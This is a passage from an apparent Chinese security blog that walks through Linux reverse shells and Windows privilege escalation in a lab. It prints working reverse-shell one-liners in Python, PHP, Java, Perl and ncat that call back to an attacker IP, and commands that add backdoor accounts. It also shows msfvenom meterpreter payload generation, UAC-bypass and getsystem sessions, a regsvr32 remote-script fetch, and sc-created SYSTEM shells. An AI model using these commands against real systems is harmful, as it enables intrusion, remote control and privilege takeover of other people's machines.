title="4.msf反弹"></a>4.msf反弹</h4><p>列出支持的cmd模块（支持python、perl、bash、netcat等）：</p><pre><code class="hljs shell">msf5 &gt; msfvenom -l payloads |grep &quot;cmd/unix/reverse&quot;[*] exec: msfvenom -l payloads |grep &quot;cmd/unix/reverse&quot;    cmd/unix/reverse                                    Creates an interactive shell through two inbound connections    cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK    cmd/unix/reverse_bash                               Creates an interactive shell via bash&#x27;s builtin /dev/tcp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.    cmd/unix/reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without /dev/tcp support. This module uses the &#x27;-z&#x27; option included on some systems to encrypt using SSL.    cmd/unix/reverse_bash_udp                           Creates an interactive shell via bash&#x27;s builtin /dev/udp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/udp feature.    cmd/unix/reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn&#x27;t usually installed by default.    cmd/unix/reverse_lua                                Creates an interactive shell via Lua    cmd/unix/reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode    cmd/unix/reverse_netcat                             Creates an interactive shell via netcat    cmd/unix/reverse_netcat_gaping                      Creates an interactive shell via netcat    cmd/unix/reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs    cmd/unix/reverse_openssl                            Creates an interactive shell through two inbound connections    cmd/unix/reverse_perl                               Creates an interactive shell via perl    cmd/unix/reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL    cmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL    cmd/unix/reverse_python                             Connect back and create a command shell via Python    cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.    cmd/unix/reverse_r                                  Connect back and create a command shell via R    cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby    cmd/unix/reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL    cmd/unix/reverse_socat_udp                          Creates an interactive shell via socat    cmd/unix/reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via &quot;-z&quot; option    cmd/unix/reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)    cmd/unix/reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn&#x27;t usually installed by default.msf5 &gt;</code></pre><p>选择对应的payload生成一句话木马(参数R可要可不要)</p><pre><code class="hljs shell">msf5 &gt; msfvenom -p cmd/unix/reverse_ncat_ssl lhost=192.168.5.1 lport=1234 R[*] exec: msfvenom -p cmd/unix/reverse_ncat_ssl lhost=192.168.5.1 lport=1234 R[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload[-] No arch selected, selecting arch: cmd from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 38 bytesncat -e /bin/sh --ssl 192.168.5.1 1234s</code></pre><p>攻击机开启监听：<code>nc -lvvp 1234</code></p><p>目标执行一句话木马：<code>ncat -e /bin/sh --ssl 192.168.5.1 1234s</code></p><h4 id="5-脚本语言一句话反弹"><a href="#5-脚本语言一句话反弹" class="headerlink" title="5.脚本语言一句话反弹"></a>5.脚本语言一句话反弹</h4><p><strong>python</strong>：</p><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;192.168.31.41&quot;</span>,<span class="hljs-number">8080</span>));os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">0</span>); os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">1</span>); os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;</code></pre><p><strong>php</strong>：</p><pre><code class="hljs tcl">php -r &#x27;$sock=fsockopen(<span class="hljs-string">&quot;192.168.31.41&quot;</span>,<span class="hljs-number">8080</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</code></pre><p><strong>java</strong>：</p><pre><code class="hljs dart">r = Runtime.getRuntime()p = r.exec([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do <span class="hljs-subst">$line</span> 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">String</span>[])p.waitFor()</code></pre><p><strong>perl</strong>：</p><pre><code class="hljs tcl">perl -e &#x27;use Socket;$i=<span class="hljs-string">&quot;192.168.31.41&quot;</span>;$p=<span class="hljs-number">8080</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</code></pre><p>网络上还有其他各种脚本，没有好坏之分，主要是看效果啦</p><h3 id="3-解决交互性差-甚至没有"><a href="#3-解决交互性差-甚至没有" class="headerlink" title="3.解决交互性差(甚至没有)"></a>3.解决交互性差(甚至没有)</h3><p>问题1： 获取的虚拟终端没有交互性，我们想给添加的账号设置密码，无法完成。 </p><p><strong>问题2</strong>：标准的错误输出无法显示，无法正常使用vim等文本编辑器等； </p><p>问题3： 获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</p><p>为了解决上述问题，有以下一些解决方案</p><h4 id="1-一句话添加账号"><a href="#1-一句话添加账号" class="headerlink" title="1.一句话添加账号"></a>1.一句话添加账号</h4><h5 id="1-chpassed"><a href="#1-chpassed" class="headerlink" title="1.chpassed"></a>1.chpassed</h5><p>在反弹的shell中执行语句：<code>useradd newuser;echo &quot;newuser:password&quot;|chpasswd</code></p><h5 id="2-useradd-p"><a href="#2-useradd-p" class="headerlink" title="2.useradd -p"></a>2.useradd -p</h5><p>在反弹的shell中执行语句：<code>useradd -p encrypted_password newuser</code></p><h5 id="3-echo-e"><a href="#3-echo-e" class="headerlink" title="3.echo -e"></a>3.echo -e</h5><p>在反弹的shell中执行语句：<code>useradd newuwer;echo -e &quot;123456n123456n&quot; |passwd newuser</code></p><h4 id="2-python-标准虚拟终端获取"><a href="#2-python-标准虚拟终端获取" class="headerlink" title="2.python 标准虚拟终端获取"></a>2.python 标准虚拟终端获取</h4><p>使用python 一句话获取标准shell:<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><p>参考：<a href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect</a></p><p><a href="https://www.anquanke.com/post/id/87017">https://www.anquanke.com/post/id/87017</a></p><p><a href="https://www.freebuf.com/articles/system/176255.html">https://www.freebuf.com/articles/system/176255.html</a></p><p><a href="https://www.hackliu.com/?p=426">https://www.hackliu.com/?p=426</a></p><p><a href="https://blog.csdn.net/weixin_45116657/article/details/103176461">https://blog.csdn.net/weixin_45116657/article/details/103176461</a></p><p><a href="http://www.360doc.com/content/19/1122/23/25947829_874875535.shtml">http://www.360doc.com/content/19/1122/23/25947829_874875535.shtml</a></p><p>一些工具及资源地址：<a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p><p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a></p><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p><a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></p><p><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p><p><a href="https://github.com/bonsaiviking/NfSpy">https://github.com/bonsaiviking/NfSpy</a></p><p><a href="https://github.com/mysqludf/lib_mysqludf_sys">https://github.com/mysqludf/lib_mysqludf_sys</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码相关操作进行提权</tag>
      
      <tag>计划任务 corn进行提权</tag>
      
      <tag>内核漏洞提权</tag>
      
      <tag>利用root权限运行的服务提权</tag>
      
      <tag>sudo提权</tag>
      
      <tag>suid提权    </tag>
      
      <tag>利用可写文件提权</tag>
      
      <tag>劫持环境变量提权</tag>
      
      <tag>网络与隐藏服务提权</tag>
      
      <tag>通配符注入提权</tag>
      
      <tag>NFS弱权限提权</tag>
      
      <tag>&#39;.&#39;路径配置错误提权</tag>
      
      <tag>mysql udf提权</tag>
      
      <tag>反弹shell</tag>
      
      <tag>敏感组提权(docker)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows提权</title>
    <link href="/2020/10/01/windows%E6%8F%90%E6%9D%83/"/>
    <url>/2020/10/01/windows%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<p>本文介绍一些常见的Windows提权方法</p><a id="more"></a><h2 id="1-msf提权"><a href="#1-msf提权" class="headerlink" title="1.msf提权"></a>1.msf提权</h2><p>目标：windows 7 sp1 vl：192.168.8.53</p><p>攻击机：kali ：192.168.8.195</p><p>生成木马：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.8.195 lport=1234 -f exe &gt;1.exe</code></p><h3 id="1-直接提权"><a href="#1-直接提权" class="headerlink" title="1.直接提权"></a>1.直接提权</h3><p><code>getsystem</code>：在目标非管理员时候会失败</p><pre><code class="hljs shell">meterpreter &gt; getsystem[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:[-] Named Pipe Impersonation (In Memory/Admin)[-] Named Pipe Impersonation (Dropper/Admin)[-] Token Duplication (In Memory/Admin)</code></pre><p>倘若成功可以使用<code>getuid</code>查看当前权限级别</p><pre><code class="hljs shell">meterpreter &gt; getsystem...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).meterpreter &gt; getuidServer username: NT AUTHORITY\SYSTEM</code></pre><h3 id="2-bypassuac"><a href="#2-bypassuac" class="headerlink" title="2.bypassuac"></a>2.bypassuac</h3><p>倘若失败后就需要bypassuac了(但是尝试本次win7主机非管理员是失败的)</p><p><code>search bypassuac</code>（选用具体模块需要测试）</p><pre><code class="hljs shell">msf5 exploit(multi/handler) &gt; search bypassuacMatching Modules================<span class="hljs-meta">   #</span><span class="bash">   Name                                                   Disclosure Date  Rank       Check  Description</span>   -   ----                                                   ---------------  ----       -----  -----------   0   exploit/windows/local/bypassuac                        2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass   1   exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)   2   exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)   3   exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)   4   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)   5   exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS   6   exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)   7   exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)   8   exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)   9   exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)   10  exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry</code></pre><p>选择一个excellent模块，需要设置一个新的session</p><pre><code class="hljs shell">msf5 exploit(multi/handler) &gt; use exploit/windows/local/bypassuac_silentcleanup msf5 exploit(windows/local/bypassuac_silentcleanup) &gt; show options                                                                                                                            Module options (exploit/windows/local/bypassuac_silentcleanup):                                                                                                                                  Name       Current Setting                                          Required  Description      ----       ---------------                                          --------  -----------      PSH_PATH   %WINDIR%\System32\WindowsPowershell\v1.0\powershell.exe  yes       The path to the Powershell binary.   SESSION                                                             yes       The session to run this module on.   SLEEPTIME  0                                                        no        The time (ms) to sleep before running SilentCleanup                                                                                                                                                                                                                                                                                      Exploit target:                                                                                                                                                                                  Id  Name                                                                                       --  ----   0   Microsoft Windows</code></pre><p>查看当前拥有的session</p><pre><code class="hljs shell">msf5 exploit(windows/local/bypassuac_silentcleanup) &gt; sessions -lActive sessions===============  Id  Name  Type                     Information                            Connection  --  ----  ----                     -----------                            ----------  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-63U3JC89N2C  192.168.8.195:1234 -&gt; 192.168.8.57:49220 (192.168.8.57)</code></pre><p>设置session</p><pre><code class="hljs shell">msf5 exploit(windows/local/bypassuac_silentcleanup) &gt; sessions -i 2[*] Starting interaction with 2...meterpreter &gt;</code></pre><p>提权并查看权限</p><pre><code class="hljs shell">meterpreter &gt; getsystem...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).meterpreter &gt; getuidServer username: NT AUTHORITY\SYSTEMmeterpreter &gt;</code></pre><h2 id="2-漏洞提权"><a href="#2-漏洞提权" class="headerlink" title="2.漏洞提权"></a>2.漏洞提权</h2><h3 id="1-补丁查询"><a href="#1-补丁查询" class="headerlink" title="1.补丁查询"></a>1.补丁查询</h3><p><code>systeminfo</code>查看windows主机相关的补丁信息</p><pre><code class="hljs shell">C:\Users\administrator.MCITP\Desktop&gt;systeminfo主机名:           WIN7OS 名称:          Microsoft Windows 7 专业版OS 版本:          6.1.7601 Service Pack 1 Build 7601OS 制造商:        Microsoft CorporationOS 配置:          成员工作站OS 构件类型:      Multiprocessor Free注册的所有人:     Windows 用户注册的组织:产品 ID:          00371-868-0000007-85264初始安装日期:     2020/10/26, 19:40:42系统启动时间:     2020/11/16, 9:02:47系统制造商:       VMware, Inc.系统型号:         VMware Virtual Platform系统类型:         x64-based PC处理器:           安装了 1 个处理器。                  [01]: Intel64 Family 6 Model 142 Stepping 10 Genu2 MhzBIOS 版本:        Phoenix Technologies LTD 6.00, 2019/7/29Windows 目录:     C:\Windows系统目录:         C:\Windows\system32启动设备:         \Device\HarddiskVolume1系统区域设置:     zh-cn;中文(中国)输入法区域设置:   zh-cn;中文(中国)时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐物理内存总量:     2,047 MB可用的物理内存:   1,418 MB虚拟内存: 最大值: 4,095 MB虚拟内存: 可用:   3,445 MB虚拟内存: 使用中: 650 MB页面文件位置:     C:\pagefile.sys域:               MCITP.COM登录服务器:       \\WIN2012修补程序:         安装了 3 个修补程序。                  [01]: KB2534111                  [02]: KB2999226                  [03]: KB976902网卡:             安装了 1 个 NIC。                  [01]: Intel(R) PRO/1000 MT Network Connection                      连接名:      本地连接                      启用 DHCP:   否                      IP 地址                        [01]: 192.168.8.57                        [02]: C:\Users\administrator.MCITP\Desktop&gt;</code></pre><p>根据已打的补丁利用未打补丁的漏洞进行攻击</p><h3 id="2-Windows-Exploit-Suggester"><a href="#2-Windows-Exploit-Suggester" class="headerlink" title="2.Windows-Exploit-Suggester"></a>2.Windows-Exploit-Suggester</h3><p><a href="https://blog.csdn.net/weixin_45018333/article/details/109121732">https://blog.csdn.net/weixin_45018333/article/details/109121732</a></p><p>更新数据库<code>python  windows-exploit-suggester.py -u</code></p><pre><code class="hljs css"><span class="hljs-selector-tag">python</span> <span class="hljs-selector-tag">windows-exploit-suggester</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">-u</span><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">initiating</span> <span class="hljs-selector-tag">winsploit</span> <span class="hljs-selector-tag">version</span> 3<span class="hljs-selector-class">.3</span>...<span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">writing</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">file</span> 2020<span class="hljs-selector-tag">-11-17-mssb</span><span class="hljs-selector-class">.xls</span><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">done</span></code></pre><p>systeminfo &gt; win.txt获取目标主机的补丁情况</p><pre><code class="hljs shell">C:\Users\haha&gt;systeminfo &gt;win7.txt</code></pre><p><code>python windows-exploit-suggester.py -i win.txt -d 更新的数据库生成的表格</code>获取相应的可利用漏洞情况，这里只列举部分</p><pre><code class="hljs shell">ython windows-exploit-suggester.py -i win.txt -d 2020-11-17-mssb.xls[*] initiating winsploit version 3.3...[*] database file detected as xls or xlsx based on extension[*] attempting to read from the systeminfo input file[+] systeminfo input file read successfully (GB2312)[*] querying database file for potential vulnerabilities[*] comparing the 168 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits[*] there are now 178 remaining vulns[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin[+] windows version identified as &#x27;Windows 7 SP1 64-bit&#x27;[*] [E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - &#x27;win32k.sys&#x27; &#x27;NtSetWindowLongPtr&#x27; Privilege Escalation (MS16-135) (2)[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255</code></pre><h3 id="3-结合msf的windows补丁枚举模块"><a href="#3-结合msf的windows补丁枚举模块" class="headerlink" title="3.结合msf的windows补丁枚举模块"></a>3.结合msf的windows补丁枚举模块</h3><p><code>run post/windows/gather/enum_patches</code>查看目标的补丁信息</p><pre><code class="hljs shell">meterpreter &gt; run post/windows/gather/enum_patches[*] Patch list saved to /root/.msf4/loot/20201117220111_default_192.168.8.57_enum_patches_307247.txt[+] KB2534111 installed on 10/26/2020[+] KB2999226 installed on 10/26/2020[+] KB976902 installed on 11/21/2010meterpreter &gt;</code></pre><p>接下来就可以利用补丁情况去进行相应攻击</p><h2 id="3-CS提权"><a href="#3-CS提权" class="headerlink" title="3.CS提权"></a>3.CS提权</h2><p>cs和msf差不多，是一个图形化和命令行交互界面，支持扩展，msf也支持图形化(kage)，但用着不顺手。。。。但还是放几张cs进行提权的图吧。。</p><h3 id="1-getsystem-大多会失败"><a href="#1-getsystem-大多会失败" class="headerlink" title="1.getsystem(大多会失败)"></a>1.getsystem(大多会失败)</h3><p>这里就不放图了，主要是懒。。。。大致步骤如下</p><p>选中目标机直接在下面命令行交互栏中输入getsystem</p><h3 id="2-bypassuac-1"><a href="#2-bypassuac-1" class="headerlink" title="2.bypassuac"></a>2.bypassuac</h3><p>选中目标机—&gt;右键选择Access—&gt;Elevate—-&gt;Exploit选择uac-eventvwr</p><h3 id="3-漏洞提权"><a href="#3-漏洞提权" class="headerlink" title="3.漏洞提权"></a>3.漏洞提权</h3><p>同2bypassuac一样，只不过Exploit选择相应的ms模块</p><h2 id="4-命令提权"><a href="#4-命令提权" class="headerlink" title="4.命令提权"></a>4.命令提权</h2><h3 id="1-at命令（高版本中演变为schtasks-exe）"><a href="#1-at命令（高版本中演变为schtasks-exe）" class="headerlink" title="1.at命令（高版本中演变为schtasks.exe）"></a>1.at命令（高版本中演变为schtasks.exe）</h3><p>在win2000、win2003、winxp可以将其由administrator提升到system。</p><p>at发布的定时计划任务，win下默认以system权限运行，定时计划任务可以是批处理、二进制文件</p><p>语法：at  时间  命令</p><pre><code class="hljs angelscript">C:\Documents <span class="hljs-keyword">and</span> Settings\Administrator&gt;at <span class="hljs-number">22</span>:<span class="hljs-number">21</span> /<span class="hljs-built_in">int</span>eractive calc.exe新加了一项作业，其作业 ID = <span class="hljs-number">2</span></code></pre><p>at结合msf</p><p>msf中：</p><pre><code class="hljs shell">msf6 exploit(multi/handler) &gt; use exploit/multi/script/web_delivery[*] Using configured payload python/meterpreter/reverse_tcpmsf6 exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf6 exploit(multi/script/web_delivery) &gt; set lhost 192.168.8.75lhost =&gt; 192.168.8.75msf6 exploit(multi/script/web_delivery) &gt; show targetsExploit targets:   Id  Name   --  ----   0   Python   1   PHP   2   PSH   3   Regsvr32   4   pubprn   5   PSH (Binary)   6   Linux   7   Mac OS Xmsf6 exploit(multi/script/web_delivery) &gt; set target 3target =&gt; 3msf6 exploit(multi/script/web_delivery) &gt; run[*] Exploit running as background job 0.[*] Exploit completed, but no session was created.[*] Started reverse TCP handler on 192.168.8.75:4444 [*] Using URL: http://0.0.0.0:8080/bYakzIMD[*] Local IP: http://192.168.8.75:8080/bYakzIMD[*] Server started.[*] Run the following command on the target machine:regsvr32 /s /n /u /i:http://192.168.8.75:8080/bYakzIMD.sct scrobj.dllmsf6 exploit(multi/script/web_delivery) &gt;</code></pre><p>目标中（win2003）：</p><pre><code class="hljs shell">C:\Documents and Settings\Administrator&gt;at 10:39 /interactive regsvr32 /s /n //i:http://192.168.8.75:8080/bYakzIMD.sct scrobj.dll新加了一项作业，其作业 ID = 1C:\Documents and Settings\Administrator&gt;</code></pre><p>会出现问题，目前没有解决方案</p><p><img src="/2020/10/01/windows%E6%8F%90%E6%9D%83/%5Cimages%5C1.png%5C" alt="q"></p><p>可以选择上线木马获取shell</p><p>目标中</p><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\D</span>ocuments and Settings<span class="hljs-symbol">\A</span>dministrator&gt;at 10:49 C:<span class="hljs-symbol">\D</span>ocuments and Settings<span class="hljs-symbol">\A</span>dministrator<span class="hljs-symbol">\桌</span>面<span class="hljs-symbol">\1</span>.exe新加了一项作业，其作业 ID = 1C:<span class="hljs-symbol">\D</span>ocuments and Settings<span class="hljs-symbol">\A</span>dministrator&gt;</code></pre><p>攻击机开启监听即可</p><pre><code class="hljs shell">msf6 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.8.75:1234 [*] Sending stage (175174 bytes) to 192.168.8.64[*] Meterpreter session 2 opened (192.168.8.75:1234 -&gt; 192.168.8.64:1038) at 2020-11-18 10:50:50 +0800meterpreter &gt; getuidServer username: WIN2003\Administratormeterpreter &gt; getsystem...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).meterpreter &gt; getuidServer username: NT AUTHORITY\SYSTEMmeterpreter &gt;</code></pre><h3 id="2-sc命令"><a href="#2-sc命令" class="headerlink" title="2.sc命令"></a>2.sc命令</h3><p>win7、03、8、08、12、16</p><p>sc是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中“服务”。</p><p><code>sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</code>创建一个名叫syscmd的新的交互式的cmd服务</p><pre><code class="hljs shell">C:\Documents and Settings\Administrator&gt;sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact[SC] CreateService 成功</code></pre><p>然后执行<code>sc start syscmd</code>，就弹出一个system权限的cmd环境</p><pre><code class="hljs shell">C:\WINDOWS\system32&gt;whoamint authority\systemC:\WINDOWS\system32&gt;</code></pre><h2 id="5-配置错误导致提权"><a href="#5-配置错误导致提权" class="headerlink" title="5.配置错误导致提权"></a>5.配置错误导致提权</h2><p>环境准备：目标：win10 1909 ：192.168.10.128</p><p>​                    攻击机：kali：192.168.8.75</p><p>先将以下保存为bat文件以管理员执行，目的是为了刚安装的虚拟机增加一些系统自启的高权限服务</p><pre><code class="hljs shell">echo [*] Create user lowusernet user lowuser lowuser1234 /addecho [*] Create directories for the binaryPath of our servicesmkdir &quot;C:\WeakServices\Weak Service 1&quot;mkdir &quot;C:\WeakServices\WeakService2&quot;mkdir &quot;C:\WeakServices\WeakService3&quot;mkdir &quot;C:\WeakServices\WeakService4&quot;echo [*] Use a default binarycopy C:\Windows\System32\snmptrap.exe &quot;C:\WeakServices\Weak Service 1\service1.exe&quot;copy C:\Windows\System32\snmptrap.exe &quot;C:\WeakServices\WeakService2\service2.exe&quot;copy C:\Windows\System32\snmptrap.exe &quot;C:\WeakServices\WeakService3\service3.exe&quot;copy C:\Windows\System32\snmptrap.exe &quot;C:\WeakServices\WeakService4\service4.exe&quot;echo [*] settings 权icacls &quot;C:\WeakServices\Weak Service 1&quot; /deny lowuser:Micacls &quot;C:\WeakServices\WeakService3&quot; /deny lowuser:Micacls &quot;C:\WeakServices\WeakService4&quot; /deny lowuser:Mecho [*] 四服务sc create WeakService1 displayName= &quot;Unquoted Service Path&quot; binPath= &quot;C:\WeakServices\Weak Service 1\service1.exe&quot; start= autosc create WeakService2 displayName= &quot;Weak Folder Permissions&quot; binPath= &quot;C:\WeakServices\WeakService2\service2.exe&quot; start= autosc create WeakService3 displayName= &quot;Weak Service Permissions&quot; binPath= &quot;C:\WeakServices\WeakService3\service3.exe&quot; obj= .\lowuser password= lowuser1234 start= autosc create WeakService4 displayName= &quot;Weak Registry Permissions&quot; binPath= &quot;C:\WeakServices\WeakService4\service4.exe&quot; start= demandecho [*] Modifying WeakService3&#x27;s permissionssc sdset WeakService3 &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;DCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</code></pre><p>成功后会增加一个lowuser，在C:\WeakServices\下增加4个文件夹，分别对应下面利用方式的一、二、三、四</p><pre><code class="hljs routeros">C:\Users\haha&gt;net user\\DESKTOP-5DQV85P 的用户帐户-------------------------------------------------------------------------------Administrator            DefaultAccount           Guestlowuser                  WDAGUtilityAccount命令成功完成。</code></pre><h3 id="1-不带引号的的路径服务"><a href="#1-不带引号的的路径服务" class="headerlink" title="1.不带引号的的路径服务"></a>1.不带引号的的路径服务</h3><h4 id="1-简述"><a href="#1-简述" class="headerlink" title="1.简述"></a>1.简述</h4><p>当系统管理员配置Windows服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。当Windows服务运行时，会发生以下两种情况之一。</p><p>1.如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。</p><p>2.如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p><p>若是第二种，例如<code>C:\WeakServices\Weak Service 1\service1.exe</code></p><p>​        寻找路径为 <code>1.C:\WeakServices\Weak</code></p><p>​                             <code>    2.C:\WeakServices\Weak Service 1</code></p><p>​                             <code>3.C:\WeakServices\Weak Service 1\service1.exe</code></p><h4 id="2-利用方法"><a href="#2-利用方法" class="headerlink" title="2.利用方法"></a>2.利用方法</h4><p>根据此寻找方式，可以将C:\WeakServices\Weak替换为C:\WeakServices\Weak.exe，Weak.exe为我们的马，因为在寻找二进制过程中，当发现由exe结尾的就会认为是对应服务的二进制文件</p><p>要想寻找不带引号的路径，可以使用wmic命令</p><p><code>wmic service get name,displayname,startmode,pathname | findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</code>  startmode:启动方式；</p><pre><code class="hljs shell">C:\Users\lowuser&gt;wmic service get name,displayname,startmode,pathname | findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;DisplayName                                            Name                                      PathName                                                                           StartModeLSM                                                    LSM                                                                                                                          UnknownNetSetupSvc                                            NetSetupSvc                                                                                                                  UnknownUnquoted Service Path                                  WeakService1                              C:\WeakServices\Weak Service 1\service1.exe                                        AutoWeak Folder Permissions                                WeakService2                              C:\WeakServices\WeakService2\service2.exe                                          AutoWeak Service Permissions                               WeakService3                              C:\WeakServices\WeakService3\service3.exe                                          AutoWeak Registry Permissions                              WeakService4                              C:\WeakServices\WeakService4\service4.exe                                          ManualC:\Users\lowuser&gt;</code></pre><p>使用sc查看对应的服务信息：<code>sc qc [servicename]</code></p><pre><code class="hljs shell">C:\Users\lowuser&gt;sc qc WeakService1[SC] QueryServiceConfig 成功SERVICE_NAME: WeakService1        TYPE               : 10  WIN32_OWN_PROCESS        START_TYPE         : 2   AUTO_START        ERROR_CONTROL      : 1   NORMAL        